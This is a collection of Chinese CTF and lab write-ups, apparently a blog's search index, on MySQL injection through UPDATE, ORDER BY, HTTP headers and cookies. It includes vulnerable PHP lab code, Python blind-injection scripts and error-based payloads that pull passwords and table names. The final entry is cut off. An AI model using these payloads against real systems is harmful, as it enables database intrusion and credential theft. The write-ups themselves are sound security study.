<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mysql之利用update进行注入]]></title>
    <url>%2F2018%2F04%2F24%2Fmysql%E4%B9%8B%E5%88%A9%E7%94%A8update%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[前言最近比赛挺多的，但是太菜了每次都没能做出题目，只能在赛后看看wp，然后学习一下师傅们的新姿势，今天主要讲的是N1CTF的两道题目还有BCTF的一个题目，这三个题目算是同一个题目的三个版本吧，每个版本都过滤了很多东西，使得注入的过程变得艰难（还是自己太菜23333 环境搭建1、在vps搭建复现环境123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php$p = $_POST[&apos;flag&apos;];$points = $_POST[&apos;hi&apos;];// echo &quot;提交的flag为：&quot;;// echo $p;// echo &apos;&lt;br /&gt;&apos;;// echo &quot;提交的hi为：&quot;;// echo $points;// echo &apos;&lt;br /&gt;&apos;;$dbhost = &apos;localhost&apos;; // mysql服务器主机地址$dbuser = &apos;root&apos;; // mysql用户名$dbpass = &apos;*********&apos;; // mysql用户名密码$conn1 = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn1 )&#123; die(&apos;连接失败: &apos; . mysqli_error($conn1));&#125;// 设置编码，防止中文乱码mysqli_query($conn1 , &quot;set names utf8&quot;);$sql1 = sprintf(&quot;UPDATE users SET points=%d%s&quot;,$p,$points);// echo &quot;当前执行的sql语句为：&quot;;// echo $sql1;echo &apos;&lt;br /&gt;&apos;;mysqli_select_db( $conn1, &apos;sqli&apos; );$retval1 = mysqli_query( $conn1, $sql1 );if(! $retval1 )&#123; die(&apos;无法更新数据: &apos; . mysqli_error($conn1));&#125;// echo &apos;数据更新成功！&apos;;// echo &apos;&lt;br /&gt;&apos;;mysqli_close($conn1);$conn2 = mysqli_connect($dbhost, $dbuser, $dbpass);$sql2 = &apos;select points from users where username = &quot;admin&quot;&apos;;// echo $sql2;// echo &apos;&lt;br /&gt;&apos;;mysqli_select_db( $conn2, &apos;sqli&apos; );$retval2 = mysqli_query( $conn2, $sql2 );while($row = mysqli_fetch_array($retval2, MYSQLI_ASSOC))&#123; echo &quot;数据库中points值为：&quot;; echo &quot;&#123;$row[&apos;points&apos;]&#125;&quot;; echo &apos;&lt;br /&gt;&apos;;&#125;mysqli_close($conn2);?&gt; 2、插入测试数据3、我们可以看到sql语句为：1$sql1 = sprintf(&quot;UPDATE users SET points=%d%s&quot;,$p,$points); 通过update更新points字段的值，然后回显在页面上，这里提交的两个参数$p和$points拼接成%d%s,因为%d会将传入的参数值转换成int型，如果从这个参数进行注入的话没办法构造完整的sql语句，这里把重点放在$points这个参数，通过构造完整的sql语句来实现对password字段的flag进行获取。 题目7777777 v1这里参考了一叶飘零师傅的一篇文章http://skysec.top/2018/03/12/N1CTF-2018-Web/通过使用mysql的模糊查询来匹配符合条件的字符，然后拼接再次匹配，直到匹配完成1update users set points=1111 where password like 0x25; 这里的0x25表示的是%，在模糊查询中表示匹配所有，在这里是将数据库中users表的points字段全部改成1111 1update users set points=2222 where password like 0x6625; 这里的0x6625表示的是f%,即匹配以f开头的password的值，然后修改其对应的points为2222，以此类推，我们可以爆破出所有password字段的值，从而获取flag。这里附上自己修改过的脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport stringimport urllibdef get_content(payload1): data = &#123; &apos;flag&apos;:5201314, &apos;hi&apos;: payload1 &#125; res = requests.post(url=url,data=data) return res.textdef comeback(payload2): data = &#123; &apos;flag&apos;:1313, &apos;hi&apos;: payload2 &#125; res = requests.post(url=url,data=data) return &apos;comeback&apos;url = &apos;http://your_vps_ip_add/index.php&apos;Tflag = &apos;&apos;#hexRflag = &apos;&apos;payload1 = &apos;&apos;payload2 = &quot; where password like 0x25&quot;comeback(payload2)for i in range(1,50): yes = 0 for j in &quot;0123456789&quot;+string.letters+&quot;!@#$^&amp;*()&#123;&#125;=+`~_&quot;: payload1 = r&quot; where password like 0x&#123;&#125;25&quot;.format(Tflag+hex(ord(j))[2:]) #print payload1 if &quot;5201314&quot; in get_content(payload1): Tflag += hex(ord(j))[2:] Rflag += str(j) print Rflag comeback(payload2) yes = 1 break if yes == 0: print &quot;flag is find,congratulation!!!!&quot; break print Rflag 后来又搜了一下别的师傅的wp，发现还有好多新姿势，下面介绍一下这些另一种角度的解法吧1、参考了https://blog.csdn.net/littlelittlebai/article/details/79535569通过构造payload1flag=0&amp;hi=|conv(hex(substr((select password),1,1)),16,10) 将查询到的password值做切割，每次取其中的一位，然后与我们所提交的points的值做|运算，结果能够得到这一位值的ascii值，从而得到flag。 2、参考了http://seaii-blog.com/index.php/2018/03/12/78.html通过构造payload12345通过&amp;&amp;运算构造条件，根据得到的points值进行盲注，从而得到结果flag=0&amp;hi=1 &amp;&amp; password&lt;&quot;A&quot;通过查询结果的切片转换返回页面回显flag=0&amp;hi=%2b(select hex(mid((select a.password from (select password from users) a),1,1))) 至于这里为什么需要嵌套一个查询可以参考https://blog.csdn.net/priestmoon/article/details/80161211mysql中You can&apos;t specify target table &lt;tbl&gt; for update in FROM clause错误的意思是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。也就是说将select出的结果再通过中间表select一遍，这样就规避了错误。注意，这个问题只出现于mysql，mssql和oracle不会出现此问题。 暂时就知道了这些姿势，如果以后遇到了新姿势在更新23333由此也可以看出注入的思路在每个人看来都是不太一样的，是一种很灵活的题目，不一定要走别人的路，因为到达目的地的路不止一条。 7777777 v2看了师傅们的博客后知道这题把like等一些关键字都过滤了，还过滤了部分数字，但是有一些符号还保留着，所以就有一下几种思路：1、payload1flag=110&amp;hi= +(password &gt; &apos;fp&apos;) 我们可以看到当password&gt;&#39;fl&#39;成立时，points的值加1并更新成功，而当password&gt;&#39;fm&#39;不成立时，points的值更新为3333，我们可以利用这种方法得到符合的值 2、payload12依然可以用7777777 v1的flag=0&amp;hi=|conv(hex(substr((select password),1,1)),16,10) 不过过滤了数字2、3、4、5、9，我们怎么才能绕过？（1）、使用length函数 length(‘11’)=2 ….. (2)、使用运算 1+1=2 7-1-1-1-1-1=2 ….. (3)、可以用二进制来绕过 00000010 7777777 v3这是BCTF上的题目，也正是看到这题之后去找了相关资料，大概了解解题思路后，便开始了尝试，结果发现和自己想象的完全不一样，测试过滤的过程总是能困扰我很久，以至于最后放弃解题，看了师傅们的wp后，深感自己能力还是差了很多，也借此鼓励一下自己，不放弃，平凡但不甘于平庸的自己。这里参考了http://blog.kingkk.com/2018/04/bctf2018-love-q/这篇文章1、分析题目过滤了很多东西 数字只有2和9能用 比较符号除了&gt;其余包括等号和小于号都被过滤了 页面没有回显 时间盲注的sleep函数和benchmark函数都被禁用了2、分析源码当sql语句执行出错时，会输出sorry，那么我们使用语法正确但是无法执行的语句会怎么样呢？这里可以构造12slect pow(2,22222222222);ERROR 1690 (22003): DOUBLE value is out of range in &apos;pow(2,222222222)&apos; 利用次方运算导致数据超出double长度时就会报错，但是不执行该语句时语法上是没问题的,这里短路运算符用不了，但是留了一个if,所以可以构造123select if(1,1,pow(2,222222222));//条件为真select if(0,1,pow(2,222222222));//条件为假 payload:123flag=2hi=&gt;&gt;if((substr(pw,(9-2-2-2-2),(9-2-2-2-2))&gt;&apos;a&apos;),2,pow(22,222222222222) 只能用&gt;进行比较运算, 于是前面的连接符就用&gt;&gt;位运算来做，后面判断勉强用 &gt; 也能找到对应字符 数字只有2和9，运算符只有 * 和 – ，于是用（9-2-2-2-2）可以构造1，有了1和2，其他的数字应该也可以自行构造了判断依据：语句为真时无回显（2&gt;&gt;2=0），语句为false（语法正确无法执行）时，输出sorry，就可以用来当作盲注的判断点这里就直接贴师傅的脚本了（自动化构造数字较难）1234567891011121314#encoding=utf8import requests, stringstr_range = string.ascii_lettersurl = &quot;http://3a7b823fc7994d62a92c3589fd05273b1254bc38b97743f2.game.ichunqiu.com&quot;for i in str_range: data = dict(flag=2,hi=&quot;&gt;&gt;if((substr(pw,2*2*2*2*2-9-2,(9-2-2-2-2))&gt;&apos;&#123;&#125;&apos;),2,pow(22,222222222222))&quot;.format(i)) r = requests.post(url, data=data) if &apos;sorry&apos; in r.text: print(&apos;sorry&apos;,i) elif &apos;hacker&apos; in r.text: print(&quot;hacker&quot;) else: print(&quot;yes&quot;,i) 后记在自己心里一直有一些疑问，实际情况中users表的值可能存在多个，如果直接按照字母来排序这种方法来解题可能会得到错误的结果，有时候大小写也会混淆了解题的一些想法，所以可能有时候有一些方法还是有局限性的，只能自己在这条路上慢慢摸索了，如果看到此文的师傅们有更好的答案，非常欢迎也希望能帮忙解答一下这些疑惑QAQ。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-session 反序列化漏洞]]></title>
    <url>%2F2018%2F04%2F19%2F%E5%A1%AB%E5%9D%91ing%2FPHP-session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[PHP-serialize 和 unserialize漏洞]]></title>
    <url>%2F2018%2F04%2F19%2F%E5%A1%AB%E5%9D%91ing%2FPHP-serialize-%E5%92%8C-unserialize%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言之前做过几题反序列化的题目，一直没有总结，刚好最近有点划水，开个坑来慢慢填，这种类型的题目在CTF中算常见的一个点，这里通过一两个题目的解题过程来说明一下该漏洞，也加深一下自己的印象吧。 认识一下序列化和反序列化1、unserialize函数（1）unserialize — 从已存储的表示中创建 PHP 的值；（2）unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值；unserialize函数详细介绍2、serialize函数（1）serialize — 产生一个可存储的值的表示；（2）serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方；（3）这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。serialize函数详细介绍3、简而言之，序列化是将变量转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。看下面的例子：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php$str = &quot;ju5tw4nty0u&quot;;$arr = array(&apos;name&apos; =&gt; &apos;ju5tw4nty0u&apos;,&quot;num&quot; =&gt; 13 ); class A&#123; public $a = 123; &#125; class B&#123; public $b = 123; public function setb()&#123; $b = 222; &#125; &#125; $a = new A(); $b = new B(); print_r($str); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($arr); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($a); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($b); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; echo &quot;-------------------------&quot;; echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; echo &apos;str---&gt;&apos;.serialize($str); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; echo &quot;arr---&gt;&quot;.serialize($arr); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; echo &quot;classA---&gt;&quot;.serialize($a); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; echo &quot;classB---&gt;&quot;.serialize($b); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; $ustr = unserialize(serialize($str)); $uarr = unserialize(serialize($arr)); $uclassA = unserialize(serialize($a)); $uclassB = unserialize(serialize($b)); echo &quot;-------------------------&quot;; echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($ustr); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($uarr); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($uclassA); echo &apos;&lt;br /&gt;&lt;br /&gt;&apos;; print_r($uclassB);?&gt; 这里我们分别序列化了字符串、数组、对象、带方法的对象，序列化后的结果为1234567891011str---&gt;s:11:&quot;ju5tw4nty0u&quot;;arr---&gt;a:2:&#123;s:4:&quot;name&quot;;s:11:&quot;ju5tw4nty0u&quot;;s:3:&quot;num&quot;;i:13;&#125;classA---&gt;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;i:123;&#125;O：1表示序列化的是对象&apos;A&apos;：1表示序列化的参数名和个数s:1:&quot;a&quot;表示长度为1的字符串i:123表示整型数字123classB---&gt;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;i:123;&#125; 将序列化的结果进行反序列化，得到1234567ju5tw4nty0uArray ( [name] =&gt; ju5tw4nty0u [num] =&gt; 13 ) A Object ( [a] =&gt; 123 ) B Object ( [b] =&gt; 123 ) 4、魔法方法php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如__construct， __destruct，__toString，__sleep，__wakeup等等。这些函数都会在某些特殊时候被自动调用。例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。这里有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。__wakeup方法会在一个对象被反序列化的时候调用。 搭建测试环境解题过程后记]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql之利用order by排序进行注入]]></title>
    <url>%2F2018%2F04%2F19%2Fmysql%E4%B9%8B%E5%88%A9%E7%94%A8order-by%E6%8E%92%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[前言突然发现更新完sqli基础关之后自己已经好久没有更新博客了，刚好最近又遇到了一些之前困扰了好久的问题，当时还不怎么理解sql注入，然后看了wp（安恒杯2月月赛-进击的盲注）还是看不懂，就记录一下吧（都怪自己太懒了23333 搭建测试环境1、这里我直接在vps上面复现了一下题目源码如下123456789101112131415161718192021222324252627282930313233343536373839404142/*index.php*/&lt;?php $dbhost = &quot;localhost&quot;; $dbuser = &quot;root&quot;; $dbpass = &quot;*********&quot;;/*这里是你的数据库密码*/ $db = &quot;sqli&quot;; $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db); mysqli_set_charset($conn,&quot;utf8&quot;); /* sql create table `admin` ( `id` int(10) not null primary key auto_increment, `username` varchar(20) not null , `password` varchar(32) not null ); */function filter($str)&#123; $filterlist = &quot;/\(|\)|username|password|where| case|when|like|regexp|into|limit|=|for|;/&quot;; if(preg_match($filterlist,strtolower($str)))&#123; die(&quot;illegal input!&quot;); &#125; return $str; &#125;$username = isset($_POST[&apos;username&apos;])?filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);$password = isset($_POST[&apos;password&apos;])?filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);$sql = &quot;select * from admin where username = &apos;$username&apos; and password = &apos;$password&apos; &quot;; $res = $conn -&gt; query($sql);if($res-&gt;num_rows&gt;0)&#123; $row = $res -&gt; fetch_assoc(); if($row[&apos;id&apos;])&#123; echo $row[&apos;username&apos;]; &#125;&#125;else&#123; echo &quot;The content in the password column is the flag!&quot;;&#125; ?&gt; 2、如果你也想本地复现的话，只要修改数据库的相关信息，然后放到站点目录访问即可。 题目详解1、从源码我们可以得到许多数据库相关的信息（库名、表名、字段），但是我们定位到关键的filter函数12345678function filter($str)&#123; $filterlist = &quot;/\(|\)|username|password|where| case|when|like|regexp|into|limit|=|for|;/&quot;; if(preg_match($filterlist,strtolower($str)))&#123; die(&quot;illegal input!&quot;); &#125; return $str; &#125; 这里发现过滤了&quot;(、)、username、password、where、 case、when、like、regexp、into、limit、=、for、;等关键字，所以一般的盲注可能行不通，这里我们通过order by盲注得到flag 2、从源码容易得到注入点在username处，通过构造username=&#39;^1^1#&amp;password=123,利用异或条件使查询条件永远为真，得到回显值admin 3、所以我们构造payload123http://vps_ip/orderbysqli_test/index.phppost:username=admin&apos; union select 1,2,&#123;&#125; order by 3#&amp;password=123 获取flag的脚本如下123456789101112131415161718192021222324252627import requestsdef sqli(payload): url = &quot;http://vps_ip/orderbysqli_test/index.php&quot; #这里是你的复现地址 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;123&apos;&#125; res = requests.post(url,data = data) #print res.text return res.textusername = &quot;admin&apos;union select 1,2,0x&#123;&#125; order by 3 desc#&quot;flag = &apos;&apos;for i in range (1,50): n = 0 for j in range (33,127): #print chr(j) n += 1 payload = username.format((flag+chr(j)).encode(&apos;hex&apos;)) #print payload if &apos;admin&apos; not in sqli(payload): flag = flag + chr(j-1) print flag break if n == 94: print &apos;find is over&apos; print flag break 4、运行脚本我们得到的结果是:对比了一下数据库里面的flag我们可以发现大小写没有区分导致得到错误的结果，那么这里我们可以用binary那实现大小写的区分只需要修改payload1username = &quot;admin&apos;union select 1,2,binray 0x&#123;&#125; order by 3 desc#&quot; 得到的结果与数据库一致，解决了大小写不敏感的问题但是这里我们发现最后一个字符是错误的，这里我们在数据库里面进行了尝试当我们同时对password和username排序时，查询的结果是正确的123456789101112131415161718192021222324252627import requestsdef sqli(payload): url = &quot;http://vps_ip/orderbysqli_test/index.php&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;123&apos;&#125; res = requests.post(url,data = data) #print res.text return res.textusername = &quot;admin&apos;union select 1,&apos;b&apos;,binary 0x&#123;&#125; order by 3,2 desc#&quot;#shengxuflag = &apos;&apos;for i in range (1,50): n = 0 for j in range (33,127): #print chr(j) n += 1 payload = username.format((flag+chr(j)).encode(&apos;hex&apos;)) #print payload if &apos;admin&apos; in sqli(payload): flag = flag + chr(j-1) print flag break if n == 94: print &apos;find is over&apos; print flag break 原理介绍1、首先我们创建一张admin表，包含id,username,password三个字段,然后插入测试数据1234567/* sql create table `admin` ( `id` int(10) not null primary key auto_increment, `username` varchar(20) not null , `password` varchar(32) not null ); */ 测试数据如下 2、我们使用union联合查询然后按照第三列(password)desc来排序查询结果1select * from admin where username = &apos;admin&apos; union select 1,2,binary &apos;e&apos; order by 3 desc; 1select * from admin where username = &apos;admin&apos; union select 1,2,binary &apos;f&apos; order by 3 desc; 1select * from admin where username = &apos;admin&apos; union select 1,2,binary &apos;g&apos; order by 3 desc; 根据测试结果我们可以利用页面回显的username来判断password字段的值是否匹配，以此类推，我们就可以得到admin这个用户对应的password字段值了。 安恒杯2月月赛-进击的盲注题目描述12345题目名称进击的盲注题目说明这里的漏洞可不是什么通用型漏洞 考点12345源代码泄露伪造password登录order by注入binary使用简单的条件竞争 1、扫目录发现robots.txt,访问后发现有index.txt,有一个waf，过滤了)(\三个符号 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpfunction dbconnection()&#123; @$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;c2FkZmFnZGZkc3Nm&quot;); // Check connection if (!$con) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysql_error(); &#125; @mysql_select_db(&quot;blindsql&quot;,$con) or die ( &quot;Unable to connect to the database&quot;); mysql_query(&quot;SET character set &apos;UTF8&apos;&quot;);&#125;function waf($id)&#123;if(preg_match(&quot;/\(|\)|\\\\/&quot;, $id)) return True;else return False;&#125;if(isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;]))&#123; $hit = &apos;&apos;; dbconnection(); $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; if(waf($username)) &#123; $hit = &quot;illegal character&quot;; &#125; else&#123; $sql=&quot;SELECT * FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot; ; $result=mysql_query($sql); @$row = mysql_fetch_array($result); #$name = $row[&apos;username&apos;]; if(isset($row)&amp;&amp;$row[&apos;username&apos;]!=&quot;admin&quot;)&#123; $hit = &quot;username error!&quot;; &#125;else&#123; if ($row[&apos;password&apos;]===md5($password))&#123; $hit = &apos;没啥用哦，还是到数据库里拿数据吧。&apos;; &#125;else&#123; $hit = &quot;password error!&quot;; &#125; &#125; &#125; mysql_close();&#125;?&gt; 查看sql连接语句，伪造密码进行登录123$sql=&quot;SELECT * FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot; ;&apos; union select 1,&apos;admin&apos;,&apos;c4ca4238a0b923820dcc509a6f75849b&amp;password=1 2、登陆后发现没有什么有用的信息 3、这里我们同样使用了order by进行盲注，方法同上，这里就不多赘述了，需要注意的是这里如果不使用binary的话没办法区分大小写，得到的结果也是错的。 4、这里得到了一个base64加密的一个页面(uP10@_nEw.php) 5、下面就是条件竞争上传一句话然后获取flag的过程了 进击的盲注wp传送门 后记这里通过两个相同类型的题目介绍了order by盲注的方法，希望大家看完能有所收获（23333]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃7（part1）]]></title>
    <url>%2F2018%2F03%2F26%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%837%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言接下去的几个关卡涉及到了http头部的一些内容，我们需要简单的了解一下这些http头部字段。详细介绍 User-Agent浏览器表明自己的身份（是哪种浏览器）;12例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14 Referer浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL；1例如：Referer：http://www.sina.com/ Cookie指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）；1Cookie：userId=C5bYpXrimdmsiQmsBPnE1Vn8ZQmdWSm3WRlEB3vRwTnRtW &lt;-- Cookie Less-18 题目提示Less-18 Header Injection- Error Based- string这里我们查看源码可知这里对uname和passwd都进行了预处理，我们没办法通过这两个参数注入； 12$uname = check_input($_POST[&apos;uname&apos;]);$passwd = check_input($_POST[&apos;passwd&apos;]); 查看SQL查询语句,发现可以通过uagent进行注入； 123$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; 构造报错语句(这里使用的是单引号处理参数，需要注意闭合单引号) 1&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e)) and &apos;1&apos;=&apos;1 Less-19 题目提示Less-19 Header Injection- Referer- Error Based- string这里应该注入点是referer，查看关键源码 123456$uname = check_input($_POST[&apos;uname&apos;]);$passwd = check_input($_POST[&apos;passwd&apos;]);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;; 构造报错语句 123&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e)) and &apos;1&apos;=&apos;1&apos;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) and &apos;1&apos;=&apos;1 Less-20 题目提示Less-20 Cookie Injection- Error Based- string这里应该是利用cookie进行注入，查看关键源码 123456$uname = check_input($_POST[&apos;uname&apos;]);$passwd = check_input($_POST[&apos;passwd&apos;]);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; 从源代码我们可以看到cookie从username中获取值，当再次刷新时，会从cookie中读取username，然后进行查询，登陆成功后，当我们修改cookie，再次刷新时，sql语句就会被修改了。 123cookie:uname=admin1&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))#cookie:uname=admin1&apos;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# Less-21 题目提示Less-21 Cookie Injection- Error Based- complex - string这里应该还是cookie注入，不过需要做一下base64编码（cookie该有单引号和括号的处理） 12345678$uname = check_input($_POST[&apos;uname&apos;]);$passwd = check_input($_POST[&apos;passwd&apos;]);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$cookee = base64_decode($cookee);$sql=&quot;SELECT * FROM users WHERE username=(&apos;$cookee&apos;) LIMIT 0,1&quot;; 我们将SQL语句先base64编码然后进行报错注入 1234567891011编码前：admin&apos;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#编码后：YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSBsaW1pdCAwLDEpLDB4N2UpLDEpIw==编码前：admin&apos;) and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#编码后：YWRtaW4nKSBhbmQgKHNlbGVjdCAxIGZyb20oc2VsZWN0IGNvdW50KCopLGNvbmNhdCgoc2VsZWN0IChzZWxlY3QgKFNFTEVDVCBkaXN0aW5jdCBjb25jYXQoMHgyMyx1c2VybmFtZSwweDNhLHBhc3N3b3JkLDB4MjMpIEZST00gdXNlcnMgbGltaXQgMCwxKSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGxpbWl0IDAsMSksZmxvb3IocmFuZCgwKSoyKSl4IGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBncm91cCBieSB4KWEpIw== Less-22 题目提示Less-22 Cookie Injection- Error Based- Double Quotes - string应该是进行双引号的处理，我们通过测试admin&quot;验证了这一想法; 1your MySQL server version for the right syntax to use near &apos;&quot;admin&quot;&quot; LIMIT 0,1&apos; at line 1 关键源码 123456789$uname = check_input($_POST[&apos;uname&apos;]);$passwd = check_input($_POST[&apos;passwd&apos;]);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$cookee = base64_decode($cookee);$cookee1 = &apos;&quot;&apos;. $cookee. &apos;&quot;&apos;;$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;; 我们将SQL语句先base64编码然后进行报错注入 1234567891011编码前：admin&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#编码后：YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGxpbWl0IDAsMSksMHg3ZSksMSkj编码前：admin&quot; and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#编码后：YWRtaW4iIGFuZCAoc2VsZWN0IDEgZnJvbShzZWxlY3QgY291bnQoKiksY29uY2F0KChzZWxlY3QgKHNlbGVjdCAoU0VMRUNUIGRpc3RpbmN0IGNvbmNhdCgweDIzLHVzZXJuYW1lLDB4M2EscGFzc3dvcmQsMHgyMykgRlJPTSB1c2VycyBsaW1pdCAyLDEpKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgbGltaXQgMCwxKSxmbG9vcihyYW5kKDApKjIpKXggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYSkj 后记这里只使用了报错注入，没有对联合注入和盲注进行尝试（有点迷），感觉应该是一样的，你留下一个问题以后补充。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃6（part1）]]></title>
    <url>%2F2018%2F03%2F26%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%836%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言在开始解题之前，我们先来了解几个数据库函数（增删改查）函数介绍传送门 Less-17 可以看到是一个修改密码的页面，利用的是update语句，首先我们找注入点，当输入uname=admin&amp;passwd=ju5tw4nty0u&#39;&amp;submit=Submit时报错，可知对passwd的处理为单引号； 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1 因为这里没有具体回显，所以可以使用报错注入或者盲注； 报错注入 1uname=admin&amp;passwd=ju5tw4nty0u&apos; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))# &amp;submit=Submit 盲注参考Less-5； 后记这题是看了源码才把注意力放在password的，之前一直在试用uname进行注入，然后找了好久没有头绪，后面在源码看到了check_input()函数，这里对uname做了处理，我们可以看看源码：1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) 